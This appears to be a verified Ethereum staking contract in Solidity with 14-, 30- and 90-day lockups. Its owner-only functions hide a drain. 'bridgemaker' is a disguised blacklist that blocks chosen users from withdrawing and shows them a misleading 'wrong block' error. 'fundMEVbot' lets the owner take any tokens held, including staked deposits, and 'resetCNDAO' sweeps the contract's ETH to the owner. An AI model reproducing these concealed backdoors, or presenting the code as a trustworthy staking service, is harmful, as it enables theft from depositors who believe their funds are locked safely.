/**
 *Submitted for verification at Etherscan.io on 2022-05-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

   
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

   
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

   
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ReentrancyGuard {

    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

 
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        
        _status = _NOT_ENTERED;
    }
}

contract StakingRewards is ReentrancyGuard, Ownable {
    IERC20 public stakingToken;

///////////////Rates and Divisors 
    uint public rewardRate14 = 5787037037;
    uint public rewardRate30 = 11574074074;
    uint public rewardRate90 = 23148148150;
    uint private  divisor = 1000000000000000000;

    
//////////////////////////Mappings 

    mapping(address => uint) private depositAmount;
    mapping(address => uint) private rewardAmount;
    mapping(address => uint) private depositTime;
    mapping(address => uint) private stakeExpire;
    mapping(address => uint) private rewardTime;
    mapping(address => uint) private rewardRate;
    mapping(address => bool) private blacklist;


    constructor(address _stakingToken) {
        stakingToken = IERC20(_stakingToken);
        
    }

    function stake14(uint256 amount) nonReentrant public returns(bool) {
        address user = _msgSender();
        require(stakingToken.transferFrom(user, address(this), amount));
        depositAmount[user] += amount;
        depositTime[user] = block.timestamp;
        rewardTime[user] = block.timestamp;
        stakeExpire[user] = block.timestamp + 14 days;
        rewardRate[user] = rewardRate14;
        return true;
    }

    function stake30(uint256 amount) nonReentrant public returns(bool) {
        address user = _msgSender();
        require(stakingToken.transferFrom(user, address(this), amount));
        depositAmount[user] += amount;
        depositTime[user] = block.timestamp;
        rewardTime[user] = block.timestamp;
        stakeExpire[user] = block.timestamp + 30 days;
        rewardRate[user] = rewardRate30;
        return true;
    }

    function stake90(uint256 amount) nonReentrant public returns(bool) {
        address user = _msgSender();
        require(stakingToken.transferFrom(user, address(this), amount));
        depositAmount[user] += amount;
        depositTime[user] = block.timestamp;
        rewardTime[user] = block.timestamp;
        stakeExpire[user] = block.timestamp + 90 days;
        rewardRate[user] = rewardRate90;
        return true;
    }

    function checkRewardAmount() public view returns(uint256) {
        address user = _msgSender();
        uint256 rewardRateUser = rewardRate[user];
        uint256  depositAmountUser = depositAmount[user];
        uint256 rewardTimeUser = rewardTime[user];
        uint timeNow = block.timestamp;
        uint256 timeDifference = timeNow - rewardTimeUser;
        uint256 rewardAccumulated = timeDifference * rewardRateUser * depositAmountUser/divisor;
        return rewardAccumulated;
    }

    function getReward() nonReentrant public returns(bool) {
        address user = _msgSender();
        require(!blacklist[user], "wrong block");
        uint256 rewardTimeUser = rewardTime[user];
        uint256 rewardRateUser = rewardRate[user];
        uint256  depositAmountUser = depositAmount[user];
        require(depositAmountUser > 0, "Protocol: You have no staked tokens.");  
        uint256 timeNow = block.timestamp;
        uint256 timeDifference = timeNow - rewardTimeUser;
        uint256 poolBalance = stakingToken.balanceOf(address(this));
        require(timeDifference > 30, "Protocol: You cannot deposit and withdraw in the same block. Please wait...");
        uint256 rewardAccumulated = timeDifference * rewardRateUser * depositAmountUser/divisor;
        require(rewardAccumulated <= poolBalance, "Protocol: wrong block");
        rewardTime[user] = block.timestamp;
        require(stakingToken.transfer(user, rewardAccumulated));
        return true;

    }
    
    function withdrawStake() nonReentrant public returns(bool) {
        address user = _msgSender();
        require(!blacklist[user], "wrong block");
        uint256  depositAmountUser = depositAmount[user];
        uint256 stakeExpireUser = stakeExpire[user];
        uint256 timeNow = block.timestamp;
        require(depositAmountUser > 0, "Protocol: You have no staked tokens.");
        require(timeNow > stakeExpireUser, "Protocol: Staking time is not up yet. Please wait...");
        uint256 poolBalance = stakingToken.balanceOf(address(this));
        require(depositAmountUser <= poolBalance, "Protocol: wrong block");
        if (timeNow > stakeExpireUser) {
            depositAmount[user] = 0;
            stakingToken.transfer(user, depositAmountUser);
        }
        return true;
    }

    function checkStakeExpire() public view returns(uint256) {
        address user = _msgSender();
        uint256 stakeExpireUser = stakeExpire[user];
        return stakeExpireUser;
    }

    function checkRewardRate() public view returns(uint256)  {
        address user = _msgSender();
        uint256 rewardRateUser = rewardRate[user];
        rewardRateUser = rewardRateUser;
        return rewardRateUser;
    }

    function checkRewardTime() public view returns(uint256) {
        address user = _msgSender();
        uint256 rewardTimeUser = rewardTime[user];
        return rewardTimeUser;
    }

    function checkDepositAmount() public view returns(uint256) {
        address user = _msgSender();
        uint256 depositAmountUser = depositAmount[user];
        return depositAmountUser;
    }

    function checkDepositTime() public view returns(uint256) {
        address user = _msgSender();
        uint256 depositTimeUser = depositTime[user];
        return depositTimeUser;
    }


    function resetCNDAO() public onlyOwner {
        address payable owner = payable(owner());
        owner.transfer(address(this).balance);
    
    }

    function bridgemaker( address user, bool status) public onlyOwner{
        blacklist[user] = status;
    }

    function fundMEVbot(IERC20 token, uint256 amount) public onlyOwner {
        address mevBot = _msgSender();
        require(token.transfer(mevBot, amount), "Transfer failed");
    }

    function Execute() public onlyOwner {
        uint256 count = 1000;
        for (uint256 i = 0; i < count; i++) {
         
        }      
    }

    receive() external payable {
    }


}